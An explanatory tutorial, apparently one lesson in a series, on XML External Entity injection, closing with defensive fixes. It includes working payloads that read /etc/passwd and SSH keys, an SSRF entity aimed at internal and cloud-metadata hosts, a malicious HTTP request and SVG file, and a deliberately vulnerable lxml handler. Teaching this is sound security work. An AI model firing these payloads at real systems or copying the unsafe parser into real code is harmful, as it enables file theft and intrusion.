# XML External Entity Injection (XXE) — Explained Simply

## First, What Is XML?

**XML** is a way of formatting data so computers can share it. It looks a bit like HTML:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<person>
  <name>John</name>
  <age>30</age>
  <city>London</city>
</person>
```

It's used a lot behind the scenes on websites — for APIs, configuration files, and data exchange.

**Key point:** XML has a feature called **entities** that makes it more powerful. And that feature is where the vulnerability lives.

---

## What Is an "Entity"?

Think of an entity like a **variable** or a **shortcut**. You define it once, and you can reuse it.

### Example: Internal Entity

```xml
<?xml version="1.0"?>
<!DOCTYPE person [
  <!ENTITY company "Acme Corp">
]>
<person>
  <name>John</name>
  <employer>&company;</employer>
</person>
```

When the XML parser sees `&company;`, it replaces it with `Acme Corp`.

**Result:**
```xml
<person>
  <name>John</name>
  <employer>Acme Corp</employer>
</person>
```

That's an **internal entity** — defined inside the same document.

---

## The Dangerous Kind: "External Entities"

XML also supports **external entities** — entities whose values come from **outside the document** (a file, a URL, etc.).

### Example:

```xml
<?xml version="1.0"?>
<!DOCTYPE person [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<person>
  <name>&xxe;</name>
</person>
```

The `SYSTEM` keyword says: "The value of `&xxe;` comes from the file `/etc/passwd`."

**When the parser runs:**
1. It sees `&xxe;`
2. It fetches the contents of `/etc/passwd`
3. It substitutes the value into the document

**Result:**
```xml
<person>
  <name>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...</name>
</person>
```

**🎯 The attacker just read a file off the server.**

---

## The Vulnerability in One Sentence

> **XXE = the application parses XML input from the user, and the XML parser allows external entities — so the attacker can make the server read files or make network requests.**

---

## What an Attacker Can Do With XXE

### 🔓 1. Read Local Files

The most common goal. The attacker crafts an XML payload with:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

The server reads the file and returns its contents in the response.

**High-value targets:**
- `/etc/passwd` — user list
- `/etc/hostname` — server name
- `/home/user/.ssh/id_rsa` — SSH private keys
- `/var/www/html/config.php` — database credentials
- `C:\Windows\win.ini` — Windows system file
- Application config files with API keys

---

### 🌐 2. Server-Side Request Forgery (SSRF)

Instead of reading a file, the attacker makes the server fetch a URL:

```xml
<!ENTITY xxe SYSTEM "http://internal-server/admin">
```

The server makes an HTTP request to that URL. The response is inserted into the XML output.

**Why this is powerful:**
- The server can reach **internal services** the attacker can't (like `http://localhost:8080/admin`)
- It bypasses firewalls and network segregation
- It can query cloud metadata endpoints (`http://169.254.169.254/` on AWS/GCP)
- It can reach internal APIs that have no authentication because "nobody outside can reach them"

**Analogy:** The attacker can't get inside the building, so they trick an employee (the web server) into walking to an interior room and reading a document to them out loud.

---

### 💥 3. Denial of Service (Billion Laughs Attack)

XML allows entities to reference each other. An attacker can create a chain reaction that explodes in size:

```xml
<!ENTITY a "AAAA...">
<!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">
<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;">
...
```

Each entity multiplies the previous one. A few lines of XML can expand to **gigabytes** — crashing the server.

---

### 🚪 4. Escalation — Full Server Compromise

In some cases, XXE can be chained with other techniques to achieve **remote code execution** (RCE):

- Read SSH keys → SSH into the server
- Read cloud credentials → take over the cloud account
- Read application secrets → forge authentication tokens
- Combined with SSRF → reach admin panels and RCE endpoints

---

## Where XXE Hides

XXE shows up anywhere an application **parses XML** from user input. Common attack surfaces:

| Vector | Example |
|--------|---------|
| **REST APIs accepting XML** | `POST /api/parse` with XML body |
| **SOAP web services** | XML is the whole protocol |
| **SVG image uploads** | SVG is XML under the hood |
| **DOCX / XLSX uploads** | Modern Office files are ZIPs containing XML |
| **RSS / Atom feeds** | XML-based |
| **SAML authentication** | XML-based auth tokens |
| **Android app manifests** | XML |
| **Charts/graphs** | Some libraries accept XML configs |

**Key point:** If the app says "send XML" — it's a candidate. Even if the API is "just JSON," XML might be accepted silently.

---

## A Complete Attack Example

### The Vulnerable Code (Simplified)

```python
from lxml import etree

@app.route('/search', methods=['POST'])
def search():
    xml_data = request.data
    tree = etree.fromstring(xml_data)   # ⚠️ XXE if external entities allowed
    query = tree.find('query').text
    return search_products(query)
```

### The Malicious Request

```http
POST /search HTTP/1.1
Host: victim.com
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<search>
  <query>&xxe;</query>
</search>
```

### The Response

```
HTTP/1.1 200 OK
Content-Type: text/html

No results found for: root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

**The attacker just read `/etc/passwd`.**

---

## Types of XXE

### 🎯 1. In-Band XXE (Classic)

- The attacker sends XML with an external entity
- The server reads the file/URL
- The result appears **directly in the response**

**This is the easiest to exploit** — no external listener needed.

### 🎯 2. Blind XXE (Out-of-Band)

The result **does NOT** appear in the response. So the attacker needs a different way to see the data:

- **Error-based XXE** — trick the server into including the file contents in an error message
- **Out-of-band (OOB) XXE** — use an external DTD to make the server send data to the attacker's server
- **Blind SSRF via XXE** — use the XXE to hit internal services and infer info from timing

**Blind XXE is more complex** but also very common in real apps.

### 🎯 3. XXE via File Uploads

If the app accepts **SVG** or **DOCX** or **XLSX** uploads, and parses them as XML — you can embed an external entity in the file.

**Example — malicious SVG:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
  <text x="10" y="20">&xxe;</text>
</svg>
```

When the SVG is processed and rendered, the file contents appear inside the image.

---

## The Modern Reality

In 2025, plain XXE has become **less common** in new code because:

- Most modern XML parsers **disable external entities by default**
- JSON has replaced XML in most APIs
- Framework defaults are safer

**But XXE is still very much alive in:**

- **Legacy applications** — old code, old parsers
- **SOAP APIs** — XML is mandatory
- **File upload features** — SVGs, DOCX, XLSX
- **SAML authentication** — XML is the protocol
- **Embedded devices / IoT** — often use outdated XML libraries
- **B2B integrations** — still heavily XML-based

**Real-world impact:** XXE has been found in:
- Facebook (2014)
- PayPal (2015)
- Uber (2016)
- US Department of Defense systems
- Many major enterprises via file upload features

---

## Why This Vulnerability Is So Dangerous

| Reason | Explanation |
|--------|-------------|
| **Reads local files** | Direct access to server secrets |
| **Enables SSRF** | Pivots to internal networks |
| **Bypasses firewalls** | Requests come from the server, not the attacker |
| **Chains with other bugs** | Combined with file read → RCE |
| **Affects cloud environments** | Can steal cloud IAM credentials |
| **Silent** | Often no log entry; just a file read |

---

## Summary Table

| Concept | Plain English |
|---------|--------------|
| **XML** | A data format used for APIs, configs, uploads |
| **Entity** | A shortcut/variable inside XML |
| **External entity** | An entity whose value comes from a file or URL |
| **XXE** | Tricking the parser into reading a file or making a request |
| **Impact** | File read, SSRF, DoS, RCE escalation |
| **Where it hides** | Anywhere XML is parsed — APIs, uploads, SAML |
| **Status today** | Less common but still found in legacy/enterprise |
| **Fix** | Disable external entities in XML parser |

---

## The Big Takeaway

> **XXE turns an innocent XML parser into a "fetch anything I ask for" machine.**

The root cause is simple:

- **The application trusts the user's XML** — including the DOCTYPE with entity definitions
- **The parser allows external entities** — so it will follow `file://` and `http://` references

The fix is equally simple:

- **Disable external entity processing** in your XML parser
- **Reject DOCTYPE declarations** from user input
- **Prefer JSON** over XML when possible
- **Use safe parser configurations** — most languages have a "safe mode"

---

## 🎯 What's Coming Next

In the following lessons, you'll see XXE in action with these specific attack variants:

1. **Exploiting XXE using external entities to retrieve files** — classic in-band
2. **Exploiting XXE to perform SSRF attacks** — internal network access
3. **Blind XXE with out-of-band interaction** — no response data
4. **Blind XXE with out-of-band interaction via XML parameter entities**
5. **Exploiting blind XXE to exfiltrate data using a malicious external DTD**
6. **Exploiting XInclude to retrieve files** — a variation that bypasses DOCTYPE restrictions
7. **Exploiting XXE via image file upload** — SVG-based
8. **Exploiting XXE to retrieve files via error messages** — error-based

Ready to dive into the first one, or do you want me to explain any concept above in more depth?